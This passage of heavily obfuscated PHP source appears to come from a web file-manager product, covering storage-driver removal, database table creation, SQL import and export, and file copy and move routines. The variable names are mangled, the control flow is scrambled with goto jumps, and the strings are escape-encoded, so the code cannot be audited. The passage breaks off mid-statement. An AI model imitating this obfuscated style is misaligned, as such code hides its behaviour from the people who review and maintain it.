”Œª¸»‘[6]], !0); $b‡†ªïö‰[] = $b¼‹‹±¥¸; } return $b‡†ªïö‰; } public function defaultDriver() { $b¢áã”Ôˆ =& $_SERVER[µ…]; $A›Ÿ¢¦í‰Ì = parent::listData(); $Cô£Ê‘‹øí = array_filter_by_field($A›Ÿ¢¦í‰Ì, $b¢áã”Ôˆ[34], 1); $Cô£Ê‘‹øí = $Cô£Ê‘‹øí[0]; if ($Cô£Ê‘‹øí) { $Cô£Ê‘‹øí[$b¢áã”Ôˆ[6]] = json_decode($Cô£Ê‘‹øí[$b¢áã”Ôˆ[6]], !0); } return $Cô£Ê‘‹øí; } public function driverInfo($f‘™Ü¡ƒ”©) { $f‚Â¦ƒ©ñ =& $_SERVER[µ…]; $C®÷‹Á…ª› = array_to_keyvalue(parent::listData(), $f‚Â¦ƒ©ñ[388]); if (!isset($C®÷‹Á…ª›[$f‘™Ü¡ƒ”©])) { return !1; } $A¡÷ì¼µƒ = $C®÷‹Á…ª›[$f‘™Ü¡ƒ”©]; $A¡÷ì¼µƒ[$f‚Â¦ƒ©ñ[6]] = json_decode($A¡÷ì¼µƒ[$f‚Â¦ƒ©ñ[6]], !0); return $A¡÷ì¼µƒ; } public function remove($dÔÍ¨Ş…ç‡) { $this->removeShareItems($dÔÍ¨Ş…ç‡); return parent::remove($dÔÍ¨Ş…ç‡); } public function removeWithFile($C âã‰Üëø, $bÀ¿¦Ì¿¢–) { goto cæø¤Š«†; F£´®Æöè: if (!$D‰Ìê‰â¨‘) { $E¤Ê«µƒÍ->stop($d¢ÎÓ¶¤¸Ã); return !1; } $E¤Ê«µƒÍ->end(); if ($bÀ¿¦Ì¿¢– == $CÅÌï¾‚Çî[1635]) { $this->remove($C âã‰Üëø); } goto fÂ„Ã¯­; ağ™ô«Å‡: $EÖŸ›øâùº = Model($CÅÌï¾‚Çî[191])->where($bÙ†Ä©”›Ü)->field($CÅÌï¾‚Çî[1980])->select(); foreach ($EÖŸ›øâùº as $Fˆ­§³ğõÀ) { goto BáÄß¿Óñ±; fßŸ†è¶Úæ: $Aà¼Òç´Ó‰ = array($CÅÌï¾‚Çî[762] => $fÅ¨…„è¨˜, $CÅÌï¾‚Çî[75] => $bÔÍŸ¸©ëò); Model($CÅÌï¾‚Çî[191])->where($bÙ†Ä©”›Ü)->save($Aà¼Òç´Ó‰); goto E¥‹¼„‰; BáÄß¿Óñ±: $aÁØ¡Éï¹Î = $Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[75]]; $bÔÍŸ¸©ëò = $f’ñÎ’‡êÎ . str_replace("\173\x69\x6f\72{$C âã‰Üëø}\x7d\57", $CÅÌï¾‚Çî[33], $aÁØ¡Éï¹Î); if (!IO::exist($aÁØ¡Éï¹Î)) { $b¼Ë¸ùÑŠÔ[] = $Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[441]]; $E¤Ê«µƒÍ->updateFileEnd($Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[28]], $Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[77]]); continue; } goto e„«¡ÍÀÅ; e„«¡ÍÀÅ: if (IO::exist($bÔÍŸ¸©ëò)) { $E¤Ê«µƒÍ->updateFileEnd($Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[28]], $Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[77]]); continue; } if (!IO::move($aÁØ¡Éï¹Î, get_path_father($bÔÍŸ¸©ëò))) { $D‰Ìê‰â¨‘ = !1; break; } $bÙ†Ä©”›Ü = array($CÅÌï¾‚Çî[441] => $Fˆ­§³ğõÀ[$CÅÌï¾‚Çî[441]]); goto fßŸ†è¶Úæ; E¥‹¼„‰: } $this->removeByFileID($b¼Ë¸ùÑŠÔ); goto F£´®Æöè; cóç‰¡ÙÛõ: $E¤Ê«µƒÍ->task[$CÅÌï¾‚Çî[713]] = (double) $eğÚåØ¸Êé; $f¼²ò¤Œìë = KodIO::defaultDriver(); $fÅ¨…„è¨˜ = $f¼²ò¤Œìë[$CÅÌï¾‚Çî[388]]; goto c¬øÏ”âš§; cæø¤Š«†: $CÅÌï¾‚Çî =& $_SERVER[µ…]; $bÙ†Ä©”›Ü = array($CÅÌï¾‚Çî[762] => $C âã‰Üëø); $F°Û¯‡™– = Model($CÅÌï¾‚Çî[444])->where($bÙ†Ä©”›Ü)->count(); goto bóŒ“Íİ ñ; c¬øÏ”âš§: $f’ñÎ’‡êÎ = "\x7b\x69\x6f\72{$fÅ¨…„è¨˜}\175\x2f"; $D‰Ìê‰â¨‘ = !0; $b¼Ë¸ùÑŠÔ = array(); goto ağ™ô«Å‡; bóŒ“Íİ ñ: $eğÚåØ¸Êé = Model($CÅÌï¾‚Çî[444])->where($bÙ†Ä©”›Ü)->sum($CÅÌï¾‚Çî[77]); $d¢ÎÓ¶¤¸Ã = $bÀ¿¦Ì¿¢– . $CÅÌï¾‚Çî[1978] . $C âã‰Üëø; $E¤Ê«µƒÍ = new TaskFileTransfer($d¢ÎÓ¶¤¸Ã, $CÅÌï¾‚Çî[1973], $F°Û¯‡™–, LNG($CÅÌï¾‚Çî[1979]) . "\x28{$C âã‰Üëø}\x29"); goto cóç‰¡ÙÛõ; fÂ„Ã¯­: } public function progress($Cå«Šš‰±£, $a†‡¿“¬«¯) { return Task::get($a†‡¿“¬«¯ . $_SERVER[µ…][1978] . $Cå«Šš‰±£); } private function removeByFileID($c©¢ù–¼è = array()) { goto E†”ˆ–‰„‰; E†”ˆ–‰„‰: $D©…Â˜«Ç =& $_SERVER[µ…]; if (empty($c©¢ù–¼è)) { return; } $dÄâç½ä”ê = array($D©…Â˜«Ç[441] => array($D©…Â˜«Ç[7], $c©¢ù–¼è)); goto fÑ©èŠôÃ’; eÖ–¯¨…ªğ: foreach ($A„Ğ¡¼³¬ as $AÖÛ«®¬Áí) { Model($D©…Â˜«Ç[403])->removeNow($AÖÛ«®¬Áí, !1); } goto E—ÔªÕ•ê¹; fÑ©èŠôÃ’: $A„Ğ¡¼³¬ = Model($D©…Â˜«Ç[1181])->where($dÄâç½ä”ê)->field($D©…Â˜«Ç[390])->select(); if (!$A„Ğ¡¼³¬) { return; } $A„Ğ¡¼³¬ = array_to_keyvalue($A„Ğ¡¼³¬, $D©…Â˜«Ç[33], $D©…Â˜«Ç[390]); goto eÖ–¯¨…ªğ; E—ÔªÕ•ê¹: } private function removeShareItems($EÒƒŒ¦¡·á) { goto Fƒ‰‚ªÆ„Ï; AÁ±»«¥³š: Model($c µ‚»òÍ[558])->remove($d¥ÜŸŒˆ«œ); goto E°™·å¦ñ–; Fƒ‰‚ªÆ„Ï: $c µ‚»òÍ =& $_SERVER[µ…]; $aô‰åÚ†éİ = "\173\151\x6f\72{$EÒƒŒ¦¡·á}\x7d\x2f"; $Eğ®¸èÚ¢ = array($c µ‚»òÍ[390] => 0, $c µ‚»òÍ[1048] => array($c µ‚»òÍ[378], "{$aô‰åÚ†éİ}\45")); goto cîÅŒĞ°Ñ¢; cîÅŒĞ°Ñ¢: $Fîß¼İÓ„‘ = Model($c µ‚»òÍ[1646])->where($Eğ®¸èÚ¢)->field($c µ‚»òÍ[462])->select(); if (empty($Fîß¼İÓ„‘)) { return; } $d¥ÜŸŒˆ«œ = array_to_keyvalue($Fîß¼İÓ„‘, $c µ‚»òÍ[33], $c µ‚»òÍ[462]); goto AÁ±»«¥³š; E°™·å¦ñ–: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x4c\151\x67\150\164\x41\160\x70"; public $modelType = "\x53\171\163\164\x65\x6d\x4f\x70\164\151\157\x6e"; public $field = array("\156\141\155\145", "\147\162\x6f\x75\x70", "\144\x65\163\143", "\x63\157\x6e\164\x65\156\164"); public function listData($F¶‡…çÆæ = false, $b‰†ˆàÀÛô = "\155\157\144\x69\146\x79\x54\x69\x6d\x65", $a·îİèáçÖ = true) { return parent::listData($F¶‡…çÆæ, $b‰†ˆàÀÛô, $a·îİèáçÖ); } public function remove($D´çøÌŠå›) { $Eææ‘»Ä‚Š = $this->findByName($D´çøÌŠå›); if (!$Eææ‘»Ä‚Š) { return !1; } return parent::remove($Eææ‘»Ä‚Š[$_SERVER[µ…][388]]); } public function add($EàÁ›¼±Å) { if ($this->findByName($EàÁ›¼±Å[$_SERVER[µ…][28]])) { return !1; } return parent::insert($EàÁ›¼±Å); } public function update($B®ŠëÚÕ…, $döÁåÁÈ‡) { $D§ğ—„×™‡ =& $_SERVER[µ…]; $a«ŸÕµÌ = $this->findByName($B®ŠëÚÕ…); $fÑ¸À¾ÖÄ£ = $this->findByName($döÁåÁÈ‡[$D§ğ—„×™‡[28]]); if (!$a«ŸÕµÌ || $fÑ¸À¾ÖÄ£ && $fÑ¸À¾ÖÄ£[$D§ğ—„×™‡[388]] != $a«ŸÕµÌ[$D§ğ—„×™‡[388]]) { return !1; } return parent::update($a«ŸÕµÌ[$D§ğ—„×™‡[388]], $döÁåÁÈ‡); } } goto cœÆÁô†‘Š; e©©­Ë¢İö: class DbManage { function __construct($FÌ¿ §ğÄˆ, $A¿©‰Ø‰ğÀ = '') { $this->database = $FÌ¿ §ğÄˆ; $this->type = $A¿©‰Ø‰ğÀ; } public function model($FŠŠÏê¿ğ© = '') { return new ModelBase($FŠŠÏê¿ğ©, $_SERVER[µ…][33], $this->database); } public function db($cˆ‹‹Óší‚ = false) { goto Dä·£ºç÷; Dä·£ºç÷: $C«²Í÷¯´ =& $_SERVER[µ…]; $B‡Æ„ä¿Ò§ = array_change_key_case($this->database); if ($this->type == $C«²Í÷¯´[9] || !$cˆ‹‹Óší‚) { return $this->model()->db(); } goto båÃöæäÛè; båÃöæäÛè: $CÍœŞÌ›¬ = $B‡Æ„ä¿Ò§[$C«²Í÷¯´[907]]; $B‡Æ„ä¿Ò§[$C«²Í÷¯´[907]] = $C«²Í÷¯´[33]; if ($B‡Æ„ä¿Ò§[$C«²Í÷¯´[739]] == $C«²Í÷¯´[740]) { $d÷ó¶œí = $B‡Æ„ä¿Ò§[$C«²Í÷¯´[741]]; $B‡Æ„ä¿Ò§[$C«²Í÷¯´[741]] = substr($d÷ó¶œí, 0, strrpos($d÷ó¶œí, $C«²Í÷¯´[995])); } goto AÁêØ¿ŒÕ¦; F¦Óò‹ƒÕ: $this->database = $B‡Æ„ä¿Ò§; $f¬òƒù†¨‹->execute("\165\x73\x65\x20\x60{$CÍœŞÌ›¬}\140"); return $f¬òƒù†¨‹; goto B°™“µ–Ü; AÁêØ¿ŒÕ¦: $this->database = $B‡Æ„ä¿Ò§; $f¬òƒù†¨‹ = $this->model()->db(); try { $e¨«²Šµ = $f¬òƒù†¨‹->execute("\x73\x68\x6f\x77\40\144\x61\164\141\x62\141\x73\145\x73\x20\x6c\151\x6b\145\x20\47{$CÍœŞÌ›¬}\x27"); } catch (Exception $f¸‚ŒˆØ’) { } goto aÅ±êù‰Ÿ†; aÅ±êù‰Ÿ†: if (!$e¨«²Šµ) { $f¬òƒù†¨‹->execute("\143\x72\145\x61\164\145\40\144\141\164\x61\142\x61\x73\x65\x20\140{$CÍœŞÌ›¬}\x60"); } $B‡Æ„ä¿Ò§[$C«²Í÷¯´[907]] = $CÍœŞÌ›¬; if ($B‡Æ„ä¿Ò§[$C«²Í÷¯´[739]] == $C«²Í÷¯´[740]) { $B‡Æ„ä¿Ò§[$C«²Í÷¯´[741]] .= $C«²Í÷¯´[995] . $CÍœŞÌ›¬; } goto F¦Óò‹ƒÕ; B°™“µ–Ü: } public function createTable($d‘ÅÜ­î×“, $eÛ”œ¶ÄÃ‡ = null) { $f“ì„´ù³¾ =& $_SERVER[µ…]; if (!IO::exist($d‘ÅÜ­î×“)) { ActionCall($f“ì„´ù³¾[996], !0, 0); show_json(LNG($f“ì„´ù³¾[997]), !1); } $bˆéãÁ­’† = sqlSplit(IO::getContent($d‘ÅÜ­î×“)); foreach ($bˆéãÁ­’† as $Cã„¢’ŒÒ) { if ($eÛ”œ¶ÄÃ‡) { $E¸”­‰Òèá = stripos($Cã„¢’ŒÒ, $f“ì„´ù³¾[998]) === 0; if ($E¸”­‰Òèá) { $eÛ”œ¶ÄÃ‡->task[$f“ì„´ù³¾[999]] += 1; } } $this->model()->db()->execute($Cã„¢’ŒÒ); if ($eÛ”œ¶ÄÃ‡ && $E¸”­‰Òèá) { preg_match($f“ì„´ù³¾[1000], $Cã„¢’ŒÒ, $fñÒäøÛ°ª); $eÛ”œ¶ÄÃ‡->task[$f“ì„´ù³¾[1001]] = $fñÒäøÛ°ª[1]; $eÛ”œ¶ÄÃ‡->update(1); } } $this->taskToCache($eÛ”œ¶ÄÃ‡); } public function insertTable($Eà°¨‹­è„, $C½´Œäë‚ = null) { $F¾‘¾šĞ´å =& $_SERVER[µ…]; $f³Á­Êç¿Ö = $this->model()->db(); $dÇîÄœ”äï = $b©™‘«•ÙÙ ? array($b©™‘«•ÙÙ) : $f³Á­Êç¿Ö->getTables(); foreach ($Eà°¨‹­è„ as $CÀµ†ÛÅŞñ) { $b©™‘«•ÙÙ = basename($CÀµ†ÛÅŞñ, $F¾‘¾šĞ´å[732]); if (!in_array($b©™‘«•ÙÙ, $dÇîÄœ”äï)) { continue; } if ($C½´Œäë‚) { $C½´Œäë‚->task[$F¾‘¾šĞ´å[1001]] = $b©™‘«•ÙÙ; } if (get_filesize($CÀµ†ÛÅŞñ) == 0) { continue; } $fÒŞ©Ê®¯ = $this->sqlToDb($CÀµ†ÛÅŞñ, $C½´Œäë‚); if (!$fÒŞ©Ê®¯) { ActionCall($F¾‘¾šĞ´å[996], !0, 0); show_json(LNG($F¾‘¾šĞ´å[1002]) . "\133{$b©™‘«•ÙÙ}\135", !1); } } $this->taskToCache($C½´Œäë‚); } public function sqlFromDb($DàÇªİ¬¶, $B„¹©Â¨Ş, $eæ’£ß Î = null, $Fí¸ööò¬ = null) { goto f†Í¬ñóŠ¬; Dã² Ãæëø: fclose($a™Œ…À•ŠÛ); return $e³ĞŠÌ³²ª; goto BŸÙ¸Ø‡îô; a¤ÏƒÚ¿Î: $a”¾åë‡‰’ = $fËŞä“”Î“->getPk(); $a‰†®ÔİÔ¼ = $fËŞä“”Î“->getDbFields(); do { $a‡¶İñ‡ = $fËŞä“”Î“->field($a‰†®ÔİÔ¼)->order($a”¾åë‡‰’ . $_SERVER[µ…][1004])->selectPage($bÌ‰¡¾ø³¤, $DŠ¨¾ó¡î); $cæ™Ê—¶¤ = isset($a‡¶İñ‡[$_SERVER[µ…][362]][$_SERVER[µ…][364]]) ? $a‡¶İñ‡[$_SERVER[µ…][362]][$_SERVER[µ…][364]] : 0; $b”õåßù ™ = !empty($a‡¶İñ‡[$_SERVER[µ…][365]]) ? $a‡¶İñ‡[$_SERVER[µ…][365]] : array(); if (!($F„ãç‡åô‹ = count($b”õåßù ™))) { break; } $Aãäª³¶Ù§ = array(); foreach ($b”õåßù ™ as $cƒêÑ‹À‰º) { if ($DàÇªİ¬¶ == $_SERVER[µ…][1005] && $cƒêÑ‹À‰º[$_SERVER[µ…][29]] == $_SERVER[µ…][1006]) { $Eİâ£ø˜ = json_decode($cƒêÑ‹À‰º[$_SERVER[µ…][370]], !0); if ($Eİâ£ø˜[$_SERVER[µ…][28]] == date($_SERVER[µ…][705]) && !$Eİâ£ø˜[$_SERVER[µ…][704]]) { continue; } } if ($Fí¸ööò¬) { $cƒêÑ‹À‰º[$_SERVER[µ…][75]] = "\173\x69\157\72{$Fí¸ööò¬}\x7d" . substr($cƒêÑ‹À‰º[$_SERVER[µ…][75]], strlen("\173\x69\157\72{$cƒêÑ‹À‰º[$_SERVER[µ…][762]]}\175")); $cƒêÑ‹À‰º[$_SERVER[µ…][762]] = $Fí¸ööò¬; } $Aãäª³¶Ù§[] = $_SERVER[µ…][1007] . $this->sqlEncode($cƒêÑ‹À‰º) . $_SERVER[µ…][1008]; } $f­¢»Ú¹ = "\x49\x4e\123\105\x52\124\40\111\x4e\x54\x4f\x20\140{$DàÇªİ¬¶}\140\40\50\140" . implode($_SERVER[µ…][1009], $a‰†®ÔİÔ¼) . $_SERVER[µ…][1010]; fwrite($a™Œ…À•ŠÛ, $f­¢»Ú¹ . implode($_SERVER[µ…][1011], $Aãäª³¶Ù§) . $_SERVER[µ…][67] . PHP_EOL); $DŠ¨¾ó¡î++; $e³ĞŠÌ³²ª += $F„ãç‡åô‹; if ($eæ’£ß Î) { $eæ’£ß Î->update($F„ãç‡åô‹); } } while ($DŠ¨¾ó¡î <= $cæ™Ê—¶¤); goto Dã² Ãæëø; bƒ„…óè¼: $DŠ¨¾ó¡î = 1; $bÌ‰¡¾ø³¤ = 500; $a™Œ…À•ŠÛ = fopen($B„¹©Â¨Ş, $_SERVER[µ…][1003]); goto a¤ÏƒÚ¿Î; f†Í¬ñóŠ¬: if ($eæ’£ß Î) { $eæ’£ß Î->task[$_SERVER[µ…][1001]] = $DàÇªİ¬¶; } $fËŞä“”Î“ = $this->model($DàÇªİ¬¶); $e³ĞŠÌ³²ª = 0; goto bƒ„…óè¼; BŸÙ¸Ø‡îô: } public function sqlToDb($Cøœğï¢, $dÈÀšçìÒ = null) { goto DŸ³¾°åÛ; D®ÏµËáÎÃ: if (trim($F–ùÍãÓ¦º)) { $F–ùÍãÓ¦º = rtrim(trim($F–ùÍãÓ¦º), $A„ƒõ·èÍë[67]); if (!$c”Ò¨¤ÜÓ²->execute($F–ùÍãÓ¦º)) { return !1; } if ($dÈÀšçìÒ) { $dÈÀšçìÒ->update($AµÌÒ¢ë© - 1); } } return !0; goto E‚½³©Æ©; Eå…šâÑÌ¶: $cö¼–İÀ× = 500 + 1; while (!feof($bÈƒÓ¸¦Œø)) { if ($dÈÀšçìÒ && $AµÌÒ¢ë© != 0) { $dÈÀšçìÒ->task[$A„ƒõ·èÍë[999]] += 1; } $AµÌÒ¢ë©++; $E¼—Òíœ–ç = trim(fgets($bÈƒÓ¸¦Œø)); $F–ùÍãÓ¦º .= $A„ƒõ·èÍë[50] . $this->sqlDecode($E¼—Òíœ–ç, $this->type); if ($AµÌÒ¢ë© == $cö¼–İÀ×) { $F–ùÍãÓ¦º = rtrim(trim($F–ùÍãÓ¦º), $A„ƒõ·èÍë[67]); if (!$c”Ò¨¤ÜÓ²->execute($F–ùÍãÓ¦º)) { return !1; } if ($dÈÀšçìÒ) { $dÈÀšçìÒ->update($AµÌÒ¢ë© - 1); } $F–ùÍãÓ¦º = $A„ƒõ·èÍë[33]; $AµÌÒ¢ë© = 0; } } fclose($bÈƒÓ¸¦Œø); goto D®ÏµËáÎÃ; FÜÎ„ß•ï: if (!$bÈƒÓ¸¦Œø) { return !1; } $AµÌÒ¢ë© = 0; $F–ùÍãÓ¦º = $A„ƒõ·èÍë[33]; goto Eå…šâÑÌ¶; DŸ³¾°åÛ: $A„ƒõ·èÍë =& $_SERVER[µ…]; $c”Ò¨¤ÜÓ² = $this->model()->db(); $bÈƒÓ¸¦Œø = @fopen($Cøœğï¢, $A„ƒõ·èÍë[1012]); goto FÜÎ„ß•ï; E‚½³©Æ©: } public function dropTable($f…Ò—æ˜À‡ = null) { $bÒ´ô¸¸„‡ = $this->model()->db(); $E¥Î©Çê©³ = $f…Ò—æ˜À‡ ? array($f…Ò—æ˜À‡) : $bÒ´ô¸¸„‡->getTables(); if (!$E¥Î©Çê©³) { return; } foreach ($E¥Î©Çê©³ as $f…Ò—æ˜À‡) { $bÒ´ô¸¸„‡->execute("\x64\x72\157\160\40\x74\141\142\x6c\145\x20\x69\x66\40\145\x78\151\163\x74\163\x20\x60{$f…Ò—æ˜À‡}\140"); } } private function taskToCache($föÈ±Ÿ‡† = null) { $FáÆÜ¹¥Ş =& $_SERVER[µ…]; if (!$föÈ±Ÿ‡†) { return; } $Fô†˜Ó¾î… = array($FáÆÜ¹¥Ş[1001] => $föÈ±Ÿ‡†->task[$FáÆÜ¹¥Ş[1001]], $FáÆÜ¹¥Ş[999] => $föÈ±Ÿ‡†->task[$FáÆÜ¹¥Ş[999]], $FáÆÜ¹¥Ş[1013] => $föÈ±Ÿ‡†->task[$FáÆÜ¹¥Ş[1013]]); if ($Fô†˜Ó¾î…[$FáÆÜ¹¥Ş[999]] == $Fô†˜Ó¾î…[$FáÆÜ¹¥Ş[1013]]) { $Fô†˜Ó¾î…[$FáÆÜ¹¥Ş[711]] = 1; } Cache::set($FáÆÜ¹¥Ş[1014] . $föÈ±Ÿ‡†->task[$FáÆÜ¹¥Ş[388]], $Fô†˜Ó¾î…); $föÈ±Ÿ‡†->end(); } private function sqlEncode($c·¹¡‰¸) { $Cö×¤¬ˆ =& $_SERVER[µ…]; $B²‹ŒáÎø¾ = array(); foreach ($c·¹¡‰¸ as $fÒƒç‚êä) { if (is_array($fÒƒç‚êä)) { $fÒƒç‚êä = json_encode_force($fÒƒç‚êä); } $fÒƒç‚êä = addslashes($fÒƒç‚êä); $fÒƒç‚êä = str_replace(array($Cö×¤¬ˆ[1015], $Cö×¤¬ˆ[227]), array($Cö×¤¬ˆ[1016], $Cö×¤¬ˆ[1017]), $fÒƒç‚êä); $B²‹ŒáÎø¾[] = str_replace($Cö×¤¬ˆ[55], $Cö×¤¬ˆ[1018], $fÒƒç‚êä); } return $Cö×¤¬ˆ[55] . implode($Cö×¤¬ˆ[1019], $B²‹ŒáÎø¾) . $Cö×¤¬ˆ[55]; } private function sqlDecode($Bìù’Ø†Ç•, $Eˆ½ÊˆŞ) { $DÉßÑšæœ“ =& $_SERVER[µ…]; $Bìù’Ø†Ç• = str_replace(array($DÉßÑšæœ“[1016], $DÉßÑšæœ“[1017]), array($DÉßÑšæœ“[1015], $DÉßÑšæœ“[227]), $Bìù’Ø†Ç•); if ($Eˆ½ÊˆŞ == $DÉßÑšæœ“[9]) { $Bìù’Ø†Ç• = stripslashes($Bìù’Ø†Ç•); } return $Bìù’Ø†Ç•; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($AŒ»£™»®Ú, $fƒ™èö‰—) { goto f»¸æ—‰Æ; aØ“´‰ÏçÓ: Hook::trigger($d³»…÷Ô«¢[1021] . $AŒ»£™»®Ú . $d³»…÷Ô«¢[1022], $b¥˜Áô¤„æ); $e™Ë‡Ğª½ = self::driverMake($fƒ™èö‰—[0]); if (method_exists($e™Ë‡Ğª½, $AŒ»£™»®Ú)) { $Cš‰“ˆ©®ê = @call_user_func_array(array($e™Ë‡Ğª½, $AŒ»£™»®Ú), $fƒ™èö‰—); } else { if (method_exists($e™Ë‡Ğª½, $d³»…÷Ô«¢[1023])) { $Cš‰“ˆ©®ê = @call_user_func_array(array($e™Ë‡Ğª½, $AŒ»£™»®Ú), $fƒ™èö‰—); } else { if (method_exists(self, $AŒ»£™»®Ú)) { $Cš‰“ˆ©®ê = @call_user_func_array(array(self, $AŒ»£™»®Ú), $fƒ™èö‰—); } else { $Cš‰“ˆ©®ê = call_user_func_array(array(parent, $AŒ»£™»®Ú), $fƒ™èö‰—); } } } goto aí–Ãì¬ì; f»¸æ—‰Æ: $d³»…÷Ô«¢ =& $_SERVER[µ…]; $b¥˜Áô¤„æ = $fƒ™èö‰—; $GLOBALS[$d³»…÷Ô«¢[1020]] = $d³»…÷Ô«¢[1021] . $AŒ»£™»®Ú; goto aØ“´‰ÏçÓ; aí–Ãì¬ì: Hook::trigger($d³»…÷Ô«¢[1021] . $AŒ»£™»®Ú . $d³»…÷Ô«¢[1024], $b¥˜Áô¤„æ, $Cš‰“ˆ©®ê); return $Cš‰“ˆ©®ê; goto cééâœË°; cééâœË°: } public static function init($B‘İÀˆäî) { return self::driverMake($B‘İÀˆäî); } public static function copy($b‹ÔóÃ©Æ, $DÂà†Ò¦‚, $fËª×ëÄÂ³ = false, $E¾‰²’®Ÿš = false) { return self::copyMoveStart($b‹ÔóÃ©Æ, $DÂà†Ò¦‚, $fËª×ëÄÂ³, $_SERVER[µ…][513], $E¾‰²’®Ÿš); } public static function move($aòõÒŠŒİº, $D½Â‚É¡ˆ–, $b ÇèÓœ½˜ = false, $bÄ¢›»­®ñ = false) { return self::copyMoveStart($aòõÒŠŒİº, $D½Â‚É¡ˆ–, $b ÇèÓœ½˜, $_SERVER[µ…][515], $bÄ¢›»­®ñ); } private static function copyMoveStart($Bë¯—é‡, $BÄãºóİ¶œ, $A‚Íì´¿ƒë, $cÔ£İåÚÙó, $e÷Øé¿„é†) { $DĞ‡¢¡›“á =& $_SERVER[µ…]; $DÖÓ¼¨à÷ó = array($Bë¯—é‡, $BÄãºóİ¶œ, $A‚Íì´¿ƒë, $e÷Øé¿„é†); Hook::trigger($DĞ‡¢¡›“á[1021] . $cÔ£İåÚÙó . $DĞ‡¢¡›“á[1022], $DÖÓ¼¨à÷ó); $D„™‡æÎê¸ = self::copyMove($Bë¯—é‡, $BÄãºóİ¶œ, $A‚Íì´¿ƒë, $cÔ£İåÚÙó, $e÷Øé¿„é†); Hook::trigger($DĞ‡¢¡›“á[1021] . $cÔ£İåÚÙó . $DĞ‡¢¡›“á[1024], $DÖÓ¼¨à÷ó, $D„™‡æÎê¸); return $D„™‡æÎê¸; } public static function saveFile($Bâ‰¹ÇêóŸ, $A®°‘„¤Ùƒ, $F¹ùŒ±™§Ü = true) { goto c¿æ–¬¢á±; c¿æ–¬¢á±: $b•ÉÇ„å¶ =& $_SERVER[µ…]; $EØ´ùˆƒÍ = self::info($A®°‘„¤Ùƒ); $e¥Á¸Ş×È = self::driverMake($Bâ‰¹ÇêóŸ); goto E‹ƒŞ¹œõ; AÖÌÎá†ææ: $dÆŒ‹Üé†ò = $Fõ í˜ˆ¬…->pathFather($A®°‘„¤Ùƒ); $C¿˜ Ó‰»ğ = !0; if (!$F¹ùŒ±™§Ü && self::driverIsSame($e¥Á¸Ş×È, $Fõ í˜ˆ¬…)) { $C¿˜ Ó‰»ğ = !1; } goto AÄâñ¹®; AÄâñ¹®: $bÌ—ìÉÕ£Ñ = self::copyFile($e¥Á¸Ş×È, $Bâ‰¹ÇêóŸ, $Fõ í˜ˆ¬…, $dÆŒ‹Üé†ò, $EØ´ùˆƒÍ[$b•ÉÇ„å¶[28]], $C¿˜ Ó‰»ğ); if ($b­·îÌëÒ½) { $bÌ—ìÉÕ£Ñ = $b­·îÌëÒ½->getPathOuter($bÌ—ìÉÕ£Ñ); } return $bÌ—ìÉÕ£Ñ; goto BÜŸïÄÃÀ; E‹ƒŞ¹œõ: $Fõ í˜ˆ¬… = self::driverMake($A®°‘„¤Ùƒ); $b­·îÌëÒ½ = !1; if ($Fõ í˜ˆ¬…->pathParse[$b•ÉÇ„å¶[1025]]) { $c¬ÛŒ´í¨ = $Fõ í˜ˆ¬…->pathParse[$b•ÉÇ„å¶[1025]]; $b­·îÌëÒ½ = $Fõ í˜ˆ¬…; $Fõ í˜ˆ¬… = self::driverMake($c¬ÛŒ´í¨); } goto AÖÌÎá†ææ; BÜŸïÄÃÀ: } private static function copyMove($D¤å’ˆ ÷Æ, $E—‹¼ïÓÆÒ, $aïæ³¸ÁÄ, $F¦ƒ°ˆ‡”Õ, $F…¥ªÌø­Ë = false) { goto bà¨ÖÈõ»; D†ùŠèÏ†·: $D±ê‚êÂ‘± = $E³©¬¾ù‘->isFile($D¤å’ˆ ÷Æ); if (!$D±ê‚êÂ‘± && $c«’¨ÍÖÔì->getType() == $BŒ¦²Êó×[709] && $E³©¬¾ù‘->getType() == $BŒ¦²Êó×[105]) { $F¾£ÔÓø…ˆ = $c«’¨ÍÖÔì->copyFolderFromIO($E³©¬¾ù‘, $D¤å’ˆ ÷Æ, $E—‹¼ïÓÆÒ, $aïæ³¸ÁÄ, $f½·ßÊ–Œ, $F…¥ªÌø­Ë); } else { $F¾£ÔÓø…ˆ = self::copyPath($E³©¬¾ù‘, $D¤å’ˆ ÷Æ, $c«’¨ÍÖÔì, $E—‹¼ïÓÆÒ, $aïæ³¸ÁÄ, $f½·ßÊ–Œ, $D±ê‚êÂ‘±, $F…¥ªÌø­Ë); } if ($F¾£ÔÓø…ˆ && $f½·ßÊ–Œ) { $E³©¬¾ù‘->remove($D¤å’ˆ ÷Æ); } goto B–‚ÊØÑøá; bà¨ÖÈõ»: $BŒ¦²Êó× =& $_SERVER[µ…]; if (!$D¤å’ˆ ÷Æ || $D¤å’ˆ ÷Æ == $BŒ¦²Êó×[8] || !$E—‹¼ïÓÆÒ) { return !1; } ignore_timeout(); goto f–×ÈÀ…±µ; f–×ÈÀ…±µ: $E³©¬¾ù‘ = self::driverMake($D¤å’ˆ ÷Æ); $c«’¨ÍÖÔì = self::driverMake($E—‹¼ïÓÆÒ); $f½·ßÊ–Œ = $F¦ƒ°ˆ‡”Õ == $BŒ¦²Êó×[515]; goto c‘Œ’›± †; c‘Œ’›± †: $dÔ«ï¤Œæ» = !1; if ($c«’¨ÍÖÔì->pathParse[$BŒ¦²Êó×[1025]]) { $E—‹¼ïÓÆÒ = $c«’¨ÍÖÔì->pathParse[$BŒ¦²Êó×[1025]]; $dÔ«ï¤Œæ» = $c«’¨ÍÖÔì; $c«’¨ÍÖÔì = self::driverMake($E—‹¼ïÓÆÒ); } self::check($E³©¬¾ù‘, $D¤å’ˆ ÷Æ, $c«’¨ÍÖÔì, $E—‹¼ïÓÆÒ); goto cË¯’¬ïš; cË¯’¬ïš: Hook::trigger($BŒ¦²Êó×[72], $E³©¬¾ù‘, $D¤å’ˆ ÷Æ, $c«’¨ÍÖÔì, $E—‹¼ïÓÆÒ); $AÑ‚š§´õê = self::driverIsSame($E³©¬¾ù‘, $c«’¨ÍÖÔì); if ($AÑ‚š§´õê) { if ($F¦ƒ°ˆ‡”Õ == $BŒ¦²Êó×[515] && !method_exists($c«’¨ÍÖÔì, $BŒ¦²Êó×[1026]) && 